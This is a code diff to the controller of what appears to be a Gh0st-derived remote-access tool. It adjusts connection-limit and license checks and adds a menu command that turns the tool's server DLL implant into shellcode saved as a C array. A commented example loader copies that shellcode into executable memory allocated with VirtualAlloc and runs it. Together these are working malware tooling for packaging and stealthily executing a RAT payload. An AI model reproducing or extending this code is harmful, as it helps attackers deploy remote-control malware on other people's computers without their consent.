@@ -287,7 +287,7 @@ CMy2015RemoteDlg::CMy2015RemoteDlg(CWnd* pParent): CDialogEx(CMy2015RemoteDlg::I
 	std::strncpy(buf, s.c_str(), 16);
 	m_superID = std::strtoull(buf, NULL, 16);
 
-	m_nMaxConnection = 0;
+	m_nMaxConnection = 2;
 	m_hExit = CreateEvent(NULL, TRUE, FALSE, NULL);
 	m_hIcon = THIS_APP->LoadIcon(IDR_MAINFRAME);
 
@@ -417,6 +417,7 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
 	ON_COMMAND(ID_ONLINE_UNAUTHORIZE, &CMy2015RemoteDlg::OnOnlineUnauthorize)
 	ON_COMMAND(ID_TOOL_REQUEST_AUTH, &CMy2015RemoteDlg::OnToolRequestAuth)
 	ON_COMMAND(ID_TOOL_INPUT_PASSWORD, &CMy2015RemoteDlg::OnToolInputPassword)
+	ON_COMMAND(ID_TOOL_GEN_SHELLCODE, &CMy2015RemoteDlg::OnToolGenShellcode)
 END_MESSAGE_MAP()
 
 
@@ -655,7 +656,7 @@ LRESULT CMy2015RemoteDlg::OnShowMessage(WPARAM wParam, LPARAM lParam) {
 		uint32_t recvHigh = (uint32_t)lParam;
 		uint64_t restored = ((uint64_t)recvHigh << 32) | recvLow;
 		if (restored != m_superID)
-			exit(-1);
+			THIS_APP->UpdateMaxConnection(3+time(0)%5);
 	}
 	return S_OK;
 }
@@ -946,7 +947,7 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
 	CreateSolidMenu();
 
 	std::string nPort = THIS_CFG.GetStr("settings", "ghost", "6543");
-	m_nMaxConnection = 1;
+	m_nMaxConnection = 2;
 	std::string pwd = THIS_CFG.GetStr("settings", "Password");
 	auto arr = StringToVector(pwd, '-', 6);
 	if (arr.size() == 7) {
@@ -1122,7 +1123,7 @@ LRESULT CMy2015RemoteDlg::OnPasswordCheck(WPARAM wParam, LPARAM lParam) {
 		dlg.DoModal();
 		if (hashSHA256(dlg.m_str.GetString()) != GetPwdHash()) {
 			KillTimer(TIMER_CHECK);
-			m_nMaxConnection = 1;
+			m_nMaxConnection = 2;
 			THIS_APP->UpdateMaxConnection(m_nMaxConnection);
 			int tm = THIS_CFG.GetInt("settings", "Notify", 10);
 			THIS_CFG.SetInt("settings", "Notify", tm - 1);
@@ -1556,7 +1557,7 @@ bool CMy2015RemoteDlg::CheckValid(int trail) {
 		if (dlg.m_sPassword != pwd)
 			THIS_CFG.SetStr(settings, pwdKey, dlg.m_sPassword.GetString());
 		
-		int maxConn = v.size() == 7 ? atoi(v[2].c_str()) : 1;
+		int maxConn = v.size() == 7 ? atoi(v[2].c_str()) : 2;
 		if (maxConn != m_nMaxConnection) {
 			m_nMaxConnection = maxConn;
 			THIS_APP->UpdateMaxConnection(m_nMaxConnection);
@@ -2916,5 +2917,81 @@ void CMy2015RemoteDlg::OnToolInputPassword()
 #endif
 			}
 		}
+	}
+}
+
+// 将二进制数据以 C 数组格式写入文件
+bool WriteBinaryAsCArray(const char* filename, LPBYTE data, size_t length, const char* arrayName = "data") {
+	FILE* file = fopen(filename, "w");
+	if (!file) return false;
+
+	fprintf(file, "unsigned char %s[] = {\n", arrayName);
+	for (size_t i = 0; i < length; ++i) {
+		if (i % 24 == 0) fprintf(file, "    ");
+		fprintf(file, "0x%02X", data[i]);
+		if (i != length - 1) fprintf(file, ",");
+		if ((i + 1) % 24 == 0 || i == length - 1) fprintf(file, "\n");
+		else fprintf(file, " ");
+	}
+	fprintf(file, "};\n");
+	fprintf(file, "unsigned int %s_len = %zu;\n", arrayName, length);
+
+	fclose(file);
+	return true;
+}
+
+/* Example: <Select TinyRun.dll to build "tinyrun.c">
+#include "tinyrun.c"
+#include <windows.h>
+#include <stdio.h>
+
+int main() {
+	void* exec = VirtualAlloc(NULL,Shellcode_len,MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
+	if (exec) {
+		memcpy(exec, Shellcode, Shellcode_len);
+		((void(*)())exec)();
+		Sleep(INFINITE);
+	}
+	return 0;
+}
+*/
+void CMy2015RemoteDlg::OnToolGenShellcode()
+{
+	CFileDialog fileDlg(TRUE, _T("dll"), "ServerDll.dll", OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT,
+		_T("DLL Files (*.dll)|*.dll|All Files (*.*)|*.*||"), AfxGetMainWnd());
+	int ret = 0;
+	try {
+		ret = fileDlg.DoModal();
+	}
+	catch (...) {
+		MessageBox("文件对话框未成功打开! 请稍后再试。", "提示", MB_ICONWARNING);
+		return;
+	}
+	if (ret == IDOK)
+	{
+		CString name = fileDlg.GetPathName();
+		CFile File;
+		BOOL r = File.Open(name, CFile::typeBinary | CFile::modeRead);
+		if (!r) {
+			MessageBox("文件打开失败! 请稍后再试。\r\n" + name, "提示", MB_ICONWARNING);
+			return;
+		}
+		int dwFileSize = File.GetLength();
+		LPBYTE szBuffer = new BYTE[dwFileSize];
+		File.Read(szBuffer, dwFileSize);
+		File.Close();
+
+		LPBYTE srcData = NULL;
+		int srcLen = 0;
+		if (MakeShellcode(srcData, srcLen, (LPBYTE)szBuffer, dwFileSize)) {
+			TCHAR buffer[MAX_PATH];
+			_tcscpy_s(buffer, name);
+			PathRemoveExtension(buffer);
+			if (WriteBinaryAsCArray(CString(buffer) + ".c", srcData, srcLen, "Shellcode")) {
+				MessageBox("Shellcode 生成成功! \r\n" + CString(buffer) + ".c", "提示", MB_ICONINFORMATION);
+			}
+		}
+		SAFE_DELETE_ARRAY(srcData);
+		SAFE_DELETE_ARRAY(szBuffer);
 	}
 }
